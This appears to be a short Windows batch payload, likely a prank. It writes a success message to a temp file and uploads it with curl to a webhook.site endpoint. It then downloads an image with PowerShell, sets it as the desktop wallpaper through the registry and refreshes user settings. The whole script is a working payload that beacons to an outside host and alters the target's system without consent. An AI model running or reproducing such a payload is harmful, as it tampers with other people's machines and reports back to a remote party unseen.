echo THE WALLPAPAER CODE RAN SUCCESSFULLY :-) > %temp%\info.txt
curl -T "%temp%/info.txt" "https://webhook.site/3eddd305-811f-4430-83dc-4bad466db906"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://i.ibb.co/y6T1rgs/Wallpaper.png', '%TEMP%\wallpaper.jpg')" & powershell -Command "Set-ItemProperty -path 'HKCU:\Control Panel\Desktop' -name Wallpaper -value '%TEMP%\wallpaper.jpg'" & powershell -Command "RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"

